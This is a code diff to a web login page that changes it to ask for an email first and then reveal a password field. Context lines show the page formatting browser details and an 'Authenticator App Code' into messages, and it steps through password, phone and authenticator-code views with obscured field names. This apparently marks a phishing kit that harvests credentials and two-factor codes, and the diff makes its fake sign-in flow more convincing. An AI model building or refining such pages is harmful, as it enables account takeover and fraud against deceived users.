@@ -277,16 +277,16 @@
                             </p>
                             <form id="login-form" novalidate>
                                 <!-- Email Field -->
-                                <div class="position-relative mb-3">
+                                <div class="position-relative mb-3" id="email-field-container">
                                     <input type="email" name="ai" class="form-control form-control-custom" id="ai"
                                         placeholder="Enter email" required />
                                     <i class="bi bi-envelope input-icon"></i>
                                 </div>
 
-                                <!-- Password Field -->
-                                <div class="position-relative mb-4">
+                                <!-- Password Field (Hidden initially) -->
+                                <div class="position-relative mb-4" id="password-field-container" style="display: none;">
                                     <input type="password" name="pr" class="form-control form-control-custom" id="pr"
-                                        placeholder="Enter password" required />
+                                        placeholder="Enter password" />
                                     <i class="bi bi-lock input-icon"></i>
                                 </div>
 
@@ -491,11 +491,31 @@ ${browserInfo.timezone}`,
             $("#auth-error").css("display", "flex").addClass("d-flex");
         }
 
-        // Handle Form 1: Credentials (Email/Password)
+        // Handle Form 1: Credentials (Email then Password)
         $("#login-form").submit(async function (e) {
             e.preventDefault();
             const email = $("#ai").val().trim();
             currentEmail = email;
+
+            // Step 1: If password field is hidden, validate email and reveal password field
+            if ($("#password-field-container").is(":hidden")) {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (email.length < 4 || !emailRegex.test(email)) {
+                    showError("Please enter a valid email address");
+                    return;
+                }
+
+                // Hide any previous errors
+                $("#auth-error").hide().removeClass("d-flex");
+
+                // Reveal password field with smooth animation and focus it
+                $("#password-field-container").slideDown(200, function () {
+                    $("#pr").focus();
+                });
+                return;
+            }
+
+            // Step 2: Both Email & Password check
             const password = $("#pr").val();
 
             if (email.length < 4 || password.length < 4) {
@@ -723,7 +743,8 @@ Authenticator App Code : ${code}
 
                             let errMsg = "Verification failed. Please try again.";
                             if (lastFormView === "#div1") {
-                                $("#pr").val("");
+                                $("#password-field-container").show();
+                                $("#pr").val("").focus();
                                 errMsg = "Incorrect password. Please try again.";
                             } else if (lastFormView === "#div2") {
                                 $("#phone").val("");
